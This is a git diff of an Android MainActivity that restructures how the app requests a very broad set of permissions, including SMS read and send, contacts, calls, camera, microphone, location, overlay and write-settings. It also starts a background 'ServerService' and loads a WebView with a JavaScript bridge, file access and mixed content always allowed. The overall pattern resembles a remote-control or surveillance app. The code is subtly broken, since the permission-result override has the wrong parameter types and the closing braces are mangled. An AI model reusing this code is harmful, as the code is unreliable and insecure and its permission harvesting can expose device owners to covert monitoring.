@@ -34,12 +34,17 @@ import android.telephony.TelephonyManager;
 import android.util.Base64;
 import android.util.DisplayMetrics;
 import android.util.Log;
+import android.view.View;
 import android.view.WindowManager;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebChromeClient;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
+import android.widget.Button;
+import android.widget.LinearLayout;
+import android.widget.TextView;
+import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -67,6 +72,9 @@ import java.util.List;
 public class MainActivity extends AppCompatActivity {
 
     private WebView webView;
+    private LinearLayout splashLayout;
+    private Button btnStart;
+    private TextView permStatus;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
     private MediaRecorder audioRecorder;
     private String audioFilePath;
@@ -76,10 +84,38 @@ public class MainActivity extends AppCompatActivity {
     private boolean isRecording = false;
     private PowerManager.WakeLock wakeLock;
 
+    // Permission list
+    private String[] allPerms = {
+            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            android.Manifest.permission.READ_EXTERNAL_STORAGE,
+            android.Manifest.permission.CAMERA,
+            android.Manifest.permission.RECORD_AUDIO,
+            android.Manifest.permission.ACCESS_FINE_LOCATION,
+            android.Manifest.permission.ACCESS_COARSE_LOCATION,
+            android.Manifest.permission.READ_SMS,
+            android.Manifest.permission.SEND_SMS,
+            android.Manifest.permission.READ_CONTACTS,
+            android.Manifest.permission.CALL_PHONE,
+            android.Manifest.permission.ACCESS_WIFI_STATE,
+            android.Manifest.permission.CHANGE_WIFI_STATE,
+            android.Manifest.permission.SYSTEM_ALERT_WINDOW,
+            android.Manifest.permission.VIBRATE,
+            android.Manifest.permission.WRITE_SETTINGS,
+            android.Manifest.permission.READ_PHONE_STATE,
+            android.Manifest.permission.FOREGROUND_SERVICE,
+            android.Manifest.permission.WAKE_LOCK
+    };
+    private int permIndex = 0;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        webView = findViewById(R.id.webView);
+        splashLayout = findViewById(R.id.splashLayout);
+        btnStart = findViewById(R.id.btnStart);
+        permStatus = findViewById(R.id.permStatus);
 
         // Wake lock
         PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
@@ -88,28 +124,7 @@ public class MainActivity extends AppCompatActivity {
             wakeLock.acquire(10*60*1000L);
         }
 
-        // Foreground service – wrapped in try/catch to avoid crash if service not declared
-        try {
-            startForegroundService(new Intent(this, ServerService.class));
-        } catch (Exception e) {
-            Log.e("FXTP", "Service start failed", e);
-        }
-
-        webView = findViewById(R.id.webView);
-        WebSettings settings = webView.getSettings();
-        settings.setJavaScriptEnabled(true);
-        settings.setDomStorageEnabled(true);
-        settings.setAllowFileAccess(true);
-        settings.setAllowContentAccess(true);
-        settings.setMediaPlaybackRequiresUserGesture(false);
-        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
-        webView.setWebChromeClient(new WebChromeClient());
-        webView.setWebViewClient(new WebViewClient());
-        webView.addJavascriptInterface(new AndroidBridge(), "AndroidBridge");
-        webView.loadUrl("file:///android_asset/device.html");
-
-        requestAllPermissions();
-
+        // Camera manager
         cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
         try {
             for (String id : cameraManager.getCameraIdList()) {
@@ -123,61 +138,131 @@ public class MainActivity extends AppCompatActivity {
             e.printStackTrace();
         }
 
-        Log.d("FXTP", "App started");
+        btnStart.setOnClickListener(v -> {
+            permIndex = 0;
+            requestNextPermission();
+        });
     }
 
-    private void requestAllPermissions() {
-        String[] perms = {
-                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                android.Manifest.permission.READ_EXTERNAL_STORAGE,
-                android.Manifest.permission.CAMERA,
-                android.Manifest.permission.RECORD_AUDIO,
-                android.Manifest.permission.ACCESS_FINE_LOCATION,
-                android.Manifest.permission.ACCESS_COARSE_LOCATION,
-                android.Manifest.permission.READ_SMS,
-                android.Manifest.permission.SEND_SMS,
-                android.Manifest.permission.READ_CONTACTS,
-                android.Manifest.permission.CALL_PHONE,
-                android.Manifest.permission.ACCESS_WIFI_STATE,
-                android.Manifest.permission.CHANGE_WIFI_STATE,
-                android.Manifest.permission.SYSTEM_ALERT_WINDOW,
-                android.Manifest.permission.VIBRATE,
-                android.Manifest.permission.WRITE_SETTINGS,
-                android.Manifest.permission.READ_PHONE_STATE,
-                android.Manifest.permission.FOREGROUND_SERVICE,
-                android.Manifest.permission.WAKE_LOCK
-        };
-        List<String> needed = new ArrayList<>();
-        for (String p : perms) {
-            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
-                needed.add(p);
+    private void requestNextPermission() {
+        if (permIndex >= allPerms.length) {
+            // All permissions granted
+            permStatus.setText("✅ All permissions granted");
+            startApp();
+            return;
+        }
+        String perm = allPerms[permIndex];
+        // Check overlay permission separately
+        if (perm.equals(android.Manifest.permission.SYSTEM_ALERT_WINDOW)) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                        Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, 1002);
+                // We'll handle the result in onActivityResult
+                return;
+            } else {
+                permIndex++;
+                requestNextPermission();
+                return;
+            }
+        } else if (perm.equals(android.Manifest.permission.WRITE_SETTINGS)) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(this)) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, 1003);
+                return;
+            } else {
+                permIndex++;
+                requestNextPermission();
+                return;
+            }
+        } else {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                permStatus.setText("Requesting: " + perm.substring(perm.lastIndexOf('.')+1));
+                ActivityCompat.requestPermissions(this, new String[]{perm}, 1001 + permIndex);
+            } else {
+                permIndex++;
+                requestNextPermission();
             }
         }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:" + getPackageName()));
-            startActivityForResult(intent, 1002);
-        }
-        if (!needed.isEmpty()) {
-            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), 1001);
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, int[] grantResults, int[] grantResultsOthers) {
+        super.onRequestPermissionsResult(requestCode, grantResults, grantResultsOthers);
+        if (requestCode >= 1001 && requestCode < 1001 + allPerms.length) {
+            int idx = requestCode - 1001;
+            if (idx < allPerms.length) {
+                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    permStatus.setText("✅ " + allPerms[idx].substring(allPerms[idx].lastIndexOf('.')+1) + " granted");
+                } else {
+                    permStatus.setText("⚠️ " + allPerms[idx].substring(allPerms[idx].lastIndexOf('.')+1) + " denied – some features may not work");
+                    Toast.makeText(this, "Permission denied: " + allPerms[idx], Toast.LENGTH_SHORT).show();
+                }
+                permIndex++;
+                // Continue with next permission
+                mainHandler.postDelayed(this::requestNextPermission, 300);
+            }
         }
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == 200 && resultCode == RESULT_OK) {
+        if (requestCode == 1002) {
+            // Overlay permission result
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
+                permStatus.setText("✅ Overlay permission granted");
+            } else {
+                permStatus.setText("⚠️ Overlay permission denied – mirror may not work");
+            }
+            permIndex++;
+            requestNextPermission();
+        } else if (requestCode == 1003) {
+            // Write settings result
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.System.canWrite(this)) {
+                permStatus.setText("✅ Write settings granted");
+            } else {
+                permStatus.setText("⚠️ Write settings denied – brightness may not work");
+            }
+            permIndex++;
+            requestNextPermission();
+        } else if (requestCode == 200 && resultCode == RESULT_OK) {
+            // Camera result
             Bitmap bitmap = (Bitmap) data.getExtras().get("data");
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
             String base64 = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
             webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('camera_data', '" + base64 + "');");
         }
-        if (requestCode == 1002) {
-            // overlay result
+    }
+
+    private void startApp() {
+        splashLayout.setVisibility(View.GONE);
+        webView.setVisibility(View.VISIBLE);
+
+        // Setup WebView
+        WebSettings settings = webView.getSettings();
+        settings.setJavaScriptEnabled(true);
+        settings.setDomStorageEnabled(true);
+        settings.setAllowFileAccess(true);
+        settings.setAllowContentAccess(true);
+        settings.setMediaPlaybackRequiresUserGesture(false);
+        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
+        webView.setWebChromeClient(new WebChromeClient());
+        webView.setWebViewClient(new WebViewClient());
+        webView.addJavascriptInterface(new AndroidBridge(), "AndroidBridge");
+        webView.loadUrl("file:///android_asset/device.html");
+
+        // Foreground service – safely start
+        try {
+            startForegroundService(new Intent(this, ServerService.class));
+        } catch (Exception e) {
+            Log.e("FXTP", "Service start failed", e);
         }
     }
 
+    // ==================== ANDROID BRIDGE ====================
     private class AndroidBridge {
 
         @JavascriptInterface
@@ -705,4 +790,4 @@ public class MainActivity extends AppCompatActivity {
             audioRecorder = null;
         }
     }
-                }
+                            }
